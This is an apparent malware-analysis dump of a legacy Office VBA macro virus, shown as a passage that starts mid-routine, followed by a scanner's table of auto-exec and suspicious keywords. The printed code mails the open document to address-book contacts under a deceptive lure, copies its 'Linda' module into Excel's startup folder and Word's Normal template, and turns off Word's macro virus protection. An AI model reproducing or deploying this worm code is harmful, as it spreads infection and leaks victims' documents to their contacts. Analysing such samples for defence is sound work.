         BreakUmOffASlice.Body = "Here is the document you asked from me... ;-)"
         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
         BreakUmOffASlice.Send
         Peep = ""
    Next y
    DasMapiName.Logoff
  End If
  
  If UngaDasOutlook = "Outlook Express" Then
    DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            BreakUmOffASlice.Recipients.Add Peep
            x = x + 1
            If x > 50 Then oo = AddyBook.AddressEntries.Count
         Next oo
         BreakUmOffASlice.Subject = "Message from " & Application.UserName
         BreakUmOffASlice.Body = "Here is the document you asked from me... ;-)"
         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
         BreakUmOffASlice.Send
         Peep = ""
    Next y
    DasMapiName.Logoff
  End If
End Sub

Sub Auto_Close()
Application.OnSheetActivate = "ExcelInf"
End Sub

Private Sub ExcelInf()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents("Linda").Export "c:\windows\system\driverXLS.sys"

With Application
.DisplayAlerts = False
.ScreenUpdating = False

.CommandBars("Tools").Controls(10).Enabled = False
.CommandBars("Tools").Controls(12).Enabled = False
.CommandBars("View").Controls(3).Enabled = False
.CommandBars("Window").Controls(3).Enabled = False
.CommandBars("Window").Controls(4).Enabled = False
End With

Set Active_ = ActiveWorkbook.VBProject.VBComponents
Book = Application.StartupPath & "\Reports_.xls"

If UCase(Dir(Book)) <> "REPORTS_.XLS" Then
    Workbooks.Add.SaveAs FileName:=Book, AddToMru:=False
    Workbooks("Reports_.xls").VBProject.VBComponents.Import "c:\windows\system\driverXLS.sys"
    ActiveWindow.Visible = False
    Workbooks("Reports_.xls").Save
End If

For i = 1 To Active_.Count
    If Active_(i).Name = "Linda" Then Installed = True
Next

If Installed = False Then
    Active_.Import "c:\windows\system\driverXLS.sys"
    ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName, AddToMru:=False
End If

Set wordx = CreateObject("word.application")
    wordx.Visible = False
    Set wordtemp = wordx.NormalTemplate.VBProject.VBComponents
    
    For j = 1 To wordtemp.Count
        If wordtemp(j).Name = "Linda" Then WordIns = True
    Next
   
    If WordIns = False Then
        wordtemp.Import "c:\windows\system\driverXLS.sys"
        Set wordtemp = Nothing
        wordx.SetAttr NormalTemplate.FullName, vbNormal
        
        wordx.Options.VirusProtection = False
        wordx.Options.SaveNormalPrompt = False
        wordx.CommandBars("View").Controls(6).Enabled = False
        wordx.CommandBars("Format").Controls(12).Enabled = False
        wordx.CommandBars("Tools").Controls(12).Enabled = False
        wordx.CommandBars("Tools").Controls(13).Enabled = False
        wordx.CommandBars("Tools").Controls(14).Enabled = False

        wordx.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
        wordx.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = ""
    wordx.SetAttr NormalTemplate.FullName, vbReadOnly
    End If
wordx.Quit
Set wordx = Nothing
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

